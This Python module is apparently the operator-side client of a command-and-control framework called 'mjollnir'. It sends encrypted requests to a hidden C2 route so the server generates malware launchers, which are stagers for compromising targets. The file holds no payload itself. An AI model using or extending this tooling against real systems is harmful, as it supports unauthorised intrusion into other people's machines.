import json
import misc
import termtables as tt
import binascii

class Launcher():
	def __init__(self, config, session, misc):
		self.config = config
		self.s = session
		self.misc = misc

	def generate_launcher(self, launcher_name, launcher_param):
		# POST mjollnir/hidden_route/launcher
		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
		endpoint = self.config["endpoints"]["launcher"]
		data = launcher_param
		data["launcher_name"] = launcher_name

		data = json.dumps(data)

		data = self.misc.encrypt(data)
		r = self.s.post(url+endpoint, data=data)
		if r.status_code == 200:
			print(self.misc.decrypt(r.content))
			return True
		else:
			print("[-] Cannot generate the launcher")
			return False

	



